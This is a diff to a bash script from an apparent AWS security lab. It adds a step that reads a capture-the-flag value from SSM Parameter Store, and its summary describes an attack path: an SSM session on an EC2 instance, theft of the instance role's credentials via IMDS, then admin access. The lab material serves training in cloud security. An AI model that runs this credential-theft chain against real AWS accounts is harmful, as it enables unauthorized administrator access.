@@ -333,12 +333,27 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 10: Capture the CTF flag
+echo -e "${YELLOW}Step 10: Capturing CTF flag from SSM Parameter Store${NC}"
+# Use the extracted EC2 role credentials (already set in the environment)
+FLAG_PARAM_NAME="/pathfinding-labs/flags/ssm-001-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" = "None" ]; then
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+echo ""
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with ssm:StartSession permission)"
@@ -346,10 +361,12 @@ echo "2. Started interactive SSM session on EC2 instance: $INSTANCE_ID"
 echo "3. Extracted instance role credentials from IMDS (Instance Metadata Service)"
 echo "4. Used credentials from: $EC2_ADMIN_ROLE"
 echo "5. Achieved: Administrator Access"
+echo "6. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (ssm:StartSession) → EC2 Instance"
 echo -e "  → (curl IMDS via IMDSv2) → $EC2_ADMIN_ROLE → Admin"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
